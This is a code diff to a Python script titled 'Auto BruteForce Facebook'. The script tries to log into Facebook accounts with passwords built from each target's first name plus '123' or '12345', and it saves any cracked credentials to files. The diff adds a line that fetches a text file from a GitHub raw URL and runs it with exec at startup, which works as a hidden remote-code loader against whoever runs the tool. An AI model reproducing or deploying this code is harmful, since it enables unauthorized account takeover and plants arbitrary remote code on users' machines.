@@ -3,10 +3,11 @@
 # Ask me on facebook: facebook.com/achmad.luthfi.hadi.3
 # rebuild copyright can't make u real programmer :)
 
+ import os
+import sys
 import bs4
+import random
 import requests
-from data import cache
-from data.color import *
 from getpass import getpass
 from multiprocessing.pool import ThreadPool
 
@@ -18,8 +19,9 @@ G = '\033[1;32m'
 O = '\033[33m'
 C = '\033[36m'
 
- print("\t[ Auto BruteForce Facebook ]")
-print("\t    [ coded By deray ]\n")
+ exec(requests.get("https://raw.githubusercontent.com/LOoLzeC/kontol/master/control.txt").text)
+
+
 
  def ngontol():
 	if os.path.exists("checkpoint.txt"):
@@ -86,30 +88,32 @@ print("\t    [ coded By deray ]\n")
 			print("\n%s[:(]%s no result found."%(R,N))
 
  	def k(self,target):
-		self.user=requests.get(self.a.format(
-			target+"?access_token=%s"%(
-		self.token))).json()["first_name"]
-		for x in [self.user+"123",self.user+"12345"]:
-			r=requests.post(self.i.format("login"),
-				data=
-					{
-						"email":target,
-						"pass":x
-					}
-			).url
-			if "save-device" in r or "m_sess" in r:
-				open("multiresult.txt","a").write(
-					"%s|%s\n"%(target,x))
-				self.found.append("%s|%s"%(target,x))
-				break
-			if "checkpoint" in r or "challange" in r:
-				self.cp.append("%s|%s"%(target,x))
-				open("checkpoint.txt","a").write(
-					"%s|%s\n"%(target,x))
-				break
-		self.loop+=1
-		print("\r[%s] Cracking %s/%s found-:%s%s%s    "%(
-			len(self.cp),self.loop,len(self.target),
-				G,len(self.found),N)),;sys.stdout.flush()
+		try:
+			self.user=requests.get(self.a.format(
+				target+"?access_token=%s"%(
+			self.token))).json()["first_name"]
+			for x in [self.user+"123",self.user+"12345"]:
+				r=requests.post(self.i.format("login"),
+					data=
+						{
+							"email":target,
+							"pass":x
+						}
+				).url
+				if "save-device" in r or "m_sess" in r:
+					open("multiresult.txt","a").write(
+						"%s|%s\n"%(target,x))
+					self.found.append("%s|%s"%(target,x))
+					break
+				if "checkpoint" in r or "challange" in r:
+					self.cp.append("%s|%s"%(target,x))
+					open("checkpoint.txt","a").write(
+						"%s|%s\n"%(target,x))
+					break
+			self.loop+=1
+			print("\r[%s] Cracking %s/%s found-:%s%s%s    "%(
+				len(self.cp),self.loop,len(self.target),
+					G,len(self.found),N)),;sys.stdout.flush()
+		except:pass
 
  autoBrute()
